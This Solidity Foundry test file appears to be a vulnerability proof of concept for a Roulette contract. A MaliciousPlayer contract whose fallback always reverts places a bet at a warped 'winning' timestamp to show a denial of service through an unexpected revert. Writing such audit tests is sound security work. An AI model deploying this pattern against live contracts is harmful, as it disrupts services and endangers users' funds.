// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/roulette.sol";

contract MaliciousPlayer {
    fallback() external payable {
        revert("Malicious contract rejects payments");
    }

    function placeBet(Roulette roulette) external payable {
        roulette.placeBet{value: msg.value}();
    }
}

contract RouletteTest is Test {
    Roulette public roulette;
    MaliciousPlayer public maliciousPlayer;
    
    function setUp() public {
        // Fund test contract with 100 ETH
        vm.deal(address(this), 100 ether);
        
        // Deploy Roulette contract with 50 ETH initial funding
        roulette = new Roulette{value: 50 ether}();
        
        // Deploy malicious player contract
        maliciousPlayer = new MaliciousPlayer();
        
        // Fund malicious player with 10 ETH for betting
        vm.deal(address(maliciousPlayer), 10 ether);
    }

    function test_DosViaUnexpectedRevert() public {
        console.log("--- BEFORE-Trigger Attack ---");
        uint initialContractBalance = address(roulette).balance;
        uint initialTotalGames = roulette.totalGames();
        console.log("Initial contract balance: %s", initialContractBalance);
        console.log("Initial total games: %s", initialTotalGames);

        emit log_named_uint("Initial contract balance", initialContractBalance);
        emit log_named_uint("Initial total games", initialTotalGames);
        emit log_named_address("Malicious player address", address(maliciousPlayer));

        // Set winning block timestamp (multiple of 15) and ensure it's new
        uint256 winningTime = 15;
        vm.warp(winningTime);

        // Verify MaliciousPlayer has enough ETH to bet
        assertEq(address(maliciousPlayer).balance, 10 ether, "Malicious player should have 10 ETH");

        console.log("--- Trigger Attack ---");
        // Execute attack - should revert
        vm.expectRevert();
        maliciousPlayer.placeBet(roulette);

        console.log("--- AFTER-Trigger Attack ---");
        uint afterContractBalance = address(roulette).balance;
        uint afterTotalGames = roulette.totalGames();
        console.log("After contract balance: %s", afterContractBalance);
        console.log("After total games: %s", afterTotalGames);

        emit log_named_uint("After contract balance", afterContractBalance);
        emit log_named_uint("After total games", afterTotalGames);

        // Comparison
        bool balanceUnchanged = (initialContractBalance == afterContractBalance);
        bool totalGamesUnchanged = (initialTotalGames == afterTotalGames);
        
        console.log("Vulnerability assessment:");
        console.log("Contract balance unchanged? %s", balanceUnchanged ? "YES" : "NO");
        console.log("Total games unchanged? %s", totalGamesUnchanged ? "YES" : "NO");
        
        if (balanceUnchanged && totalGamesUnchanged) {
            console.log("Vulnerability Exists: Attack caused revert and state remains unchanged");
        } else {
            console.log("Vulnerability not Exist: State changed after attack");
        }
    }
}